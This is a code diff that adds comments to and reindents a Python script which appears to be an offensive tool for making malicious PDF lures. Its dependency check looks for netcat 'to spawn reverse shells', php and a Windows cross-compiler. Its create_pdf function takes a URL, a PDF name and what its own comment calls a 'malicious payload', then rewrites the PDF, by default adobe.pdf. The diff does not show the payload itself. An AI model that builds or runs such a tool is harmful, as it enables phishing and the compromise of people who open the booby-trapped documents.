@@ -27,34 +27,35 @@ except NameError: # If the variable, function or module doesn't exist
 
 
 def dependencies(): # This is additional code that wants to be involved 
- # This involves installing all the necessary modules if they aren't installed
+    # This involves installing all the necessary modules if they aren't installed
 
- os.system('command -v base64 > /dev/null 2>&1 || { echo >&2 "Install base64"; }') # to encode/decode in base64
- os.system('command -v zip > /dev/null 2>&1 || { echo >&2 "Install zip"; }') # interact with zip files
- os.system('command -v netcat > /dev/null 2>&1 || { echo >&2 "Install netcat"; }') # to spawn reverse shells
- os.system('command -v php > /dev/null 2>&1 || { echo >&2 "Install php"; }') # interact with a web env
-# os.system('command -v ssh > /dev/null 2>&1 || { echo >&2 "Install ssh"; }') # secure shell connections
- os.system('command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "Install mingw-w64"; }') # to compile C code
+    os.system('command -v base64 > /dev/null 2>&1 || { echo >&2 "Install base64"; }') # to encode/decode in base64
+    os.system('command -v zip > /dev/null 2>&1 || { echo >&2 "Install zip"; }') # interact with zip files
+    os.system('command -v netcat > /dev/null 2>&1 || { echo >&2 "Install netcat"; }') # to spawn reverse shells
+    os.system('command -v php > /dev/null 2>&1 || { echo >&2 "Install php"; }') # interact with a web env
+    # os.system('command -v ssh > /dev/null 2>&1 || { echo >&2 "Install ssh"; }') # secure shell connections
+    os.system('command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "Install mingw-w64"; }') # to compile C code
 
 def shutdown(signal,frame): # To shutdown the program
-
-  print ("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Exiting...\033[0m\n") # Print that program is exiting with ANSI colour code
-#  os.system('killall -9 php > /dev/null 2>&1') # kill php process
-#  os.system('killall -9 ssh > /dev/null 2>&1') # kill ssh process
-  os.system("rm -rf page.html index.html") # remove page and index files completely
-  sys.exit() # exit using system call
+    print ("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Exiting...\033[0m\n") # Print that program is exiting with ANSI colour code
+    #  os.system('killall -9 php > /dev/null 2>&1') # kill php process
+    #  os.system('killall -9 ssh > /dev/null 2>&1') # kill ssh process
+    os.system("rm -rf page.html index.html") # remove page and index files completely
+    sys.exit() # exit using system call
 
 signal.signal(signal.SIGINT, shutdown) # Function call for custom 
 # handlers to be called and executed when signal received, signal.SIGINT represents a KeyboardInterrupt 
 # process and the frame is the shutdown function
 
 
-def create_pdf(url,pdf_name,payload_name):
+def create_pdf(url,pdf_name,payload_name): # function to create a pdf, supply the url with the pdf name and malicious payload
 
- print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Generating PDF file...\033[0m")
- time.sleep(2)
- if pdf_name == "":
-   pdf_name=open('adobe.pdf', 'rb')
+ print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Generating PDF file...\033[0m") # Notify user of generating pdf file
+ time.sleep(2) # wait 2 seconds
+    
+ if pdf_name == "": # if user doesn't select a name for pdf file
+   pdf_name=open('adobe.pdf', 'rb') # default to adobe.pdf and open in 'read bytes' format
+ 
  unmeta=PdfFileReader("%s" % (pdf_name), "rb")
  meta=PdfFileWriter()
  meta.appendPagesFromReader(unmeta)
